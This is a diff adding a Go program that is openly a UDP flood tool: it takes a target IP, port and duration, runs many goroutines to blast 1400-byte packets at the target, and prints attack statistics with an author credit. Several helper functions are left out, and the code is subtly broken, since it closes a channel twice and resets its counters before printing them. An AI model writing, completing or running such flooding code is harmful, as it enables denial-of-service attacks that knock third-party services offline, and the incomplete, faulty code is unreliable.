@@ -1,0 +1,139 @@
+package main
+
+import (
+    "fmt"
+    "log"
+    "math/rand"
+    "net"
+    "os"
+    "os/signal"
+    "runtime"
+    "strconv"
+    "sync"
+    "syscall"
+    "time"
+)
+
+const (
+    packetSize    = 1400
+    chunkDuration = 280
+    expiryDate    = "2025-06-17T23:00:00"
+)
+
+// Stats keeps track of statistics during the attack
+type Stats struct {
+    PacketsSent       int
+    PacketsSuccessful int
+    PacketsFailed     int
+    BytesSent         int
+    sync.Mutex
+}
+
+// ConnectionManager manages UDP connections to reuse them
+type ConnectionManager struct {
+    connections map[string]*net.UDPConn
+    sync.Mutex
+}
+
+func newConnectionManager() *ConnectionManager {
+    return &ConnectionManager{
+        connections: make(map[string]*net.UDPConn),
+    }
+}
+
+func (cm *ConnectionManager) getConnection(targetAddr string) (*net.UDPConn, error) {
+    cm.Lock()
+    defer cm.Unlock()
+    if conn, exists := cm.connections[targetAddr]; exists && conn != nil {
+        return conn, nil
+    }
+    newConn, err := createConnection(targetAddr)
+    if err != nil {
+        return nil, err
+    }
+    cm.connections[targetAddr] = newConn
+    return newConn, nil
+}
+
+func (cm *ConnectionManager) closeAll() {
+    cm.Lock()
+    defer cm.Unlock()
+    for _, conn := range cm.connections {
+        conn.Close()
+    }
+    cm.connections = make(map[string]*net.UDPConn) // Reset the map after closing all connections
+}
+
+func main() {
+    checkExpiry()
+
+    if len(os.Args) != 4 {
+        fmt.Println("Usage: go run main.go <target_ip> <target_port> <attack_duration>")
+        return
+    }
+
+    targetIP := os.Args[1]
+    targetPort := os.Args[2]
+    attackDuration, err := strconv.Atoi(os.Args[3])
+    if err != nil || attackDuration <= 0 {
+        fmt.Println("Invalid attack duration:", err)
+        return
+    }
+    durationTime := time.Duration(attackDuration) * time.Second
+
+    numThreads := max(1, int(float64(runtime.NumCPU())*2.5))
+    packetsPerSecond := 1_000_000_000 / packetSize
+
+    var wg sync.WaitGroup
+    done := make(chan struct{})
+    signalChan := make(chan os.Signal, 1)
+    signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)
+
+    stats := &Stats{}
+    connManager := newConnectionManager()
+
+    go func() {
+        <-signalChan
+        close(done)
+    }()
+
+    go countdown(durationTime, done)
+
+    targetAddr := targetIP + ":" + targetPort
+
+    for i := 0; i < numThreads; i++ {
+        wg.Add(1)
+        go func() {
+            defer wg.Done()
+            conn, err := connManager.getConnection(targetAddr)
+            if err != nil {
+                log.Printf("Error getting connection: %v\n", err)
+                return
+            }
+            sendUDPPackets(conn, packetsPerSecond/numThreads, durationTime, done, stats)
+        }()
+    }
+
+    wg.Wait()
+    connManager.closeAll()
+    close(done) // Ensure that done channel is closed to terminate all goroutines properly
+
+    // Reset state after each attack
+    resetStats(stats)
+
+    // Cooldown between repeated attacks
+    cooldownBetweenAttacks()
+
+    mbDelivered := float64(stats.BytesSent) / 1024 / 1024
+    gbDelivered := mbDelivered / 1024
+
+    fmt.Println("\nSCRIPT CODED BY @A_X_J_111")
+    fmt.Println("ATTACK FINISHED:")
+    fmt.Printf("PACKETS___SENT: %d\n", stats.PacketsSent)
+    fmt.Printf("PACKETS___SUCCESSFUL: %d\n", stats.PacketsSuccessful)
+    fmt.Printf("PACKETS___FAILED: %d\n", stats.PacketsFailed)
+    fmt.Printf("DATA____DELIVERED: %.2f MB\n", mbDelivered)
+    fmt.Printf("DATA___DELIVERED (IN GB): %.2f GB\n", gbDelivered)
+}
+
+// Remaining functions remain unchanged.
